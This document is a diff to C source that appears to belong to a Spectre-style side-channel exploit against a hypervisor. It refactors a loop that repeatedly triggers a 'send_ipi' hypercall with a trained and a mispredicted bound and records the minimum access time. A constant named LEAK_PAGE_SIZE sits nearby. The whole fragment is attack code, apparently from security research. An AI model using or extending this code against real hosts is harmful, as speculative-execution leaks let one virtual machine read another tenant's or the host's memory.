@@ -17,7 +17,7 @@
 
 #define LEAK_PAGE_SIZE (2097152) // 2MiB
 
-int hypercall(struct send_ipi_hypercall_opts *opts) {
+int hypercall(struct send_ipi_hypercall *opts) {
   const char *hypercall_path = "/proc/hypercall/send_ipi";
   int fd = open(hypercall_path, O_WRONLY);
   if (fd < 0) {
@@ -42,18 +42,13 @@ size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_ad
 }
 
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
-  struct send_ipi_hypercall_opts opts[2] = {0};
-  opts[0].mask_low = -1;
-  opts[0].min = 0;
-  opts[1].mask_low = -1;
-  opts[1].min = idx;
+  struct send_ipi_hypercall opts = {
+      .real = {.mask_low = -1, .min = 0}, .mispredicted = {.mask_low = -1, .min = idx}, .ptr = buf};
 
   size_t min = -1;
   for (size_t i = 0; i < iters; ++i) {
-    clflush(buf);
-    hypercall(opts);
-    size_t time = access_time(buf);
-    min = time < min ? time : min;
+    size_t access_time = hypercall(&opts);
+    min = access_time < min ? access_time : min;
   }
 
   return min;
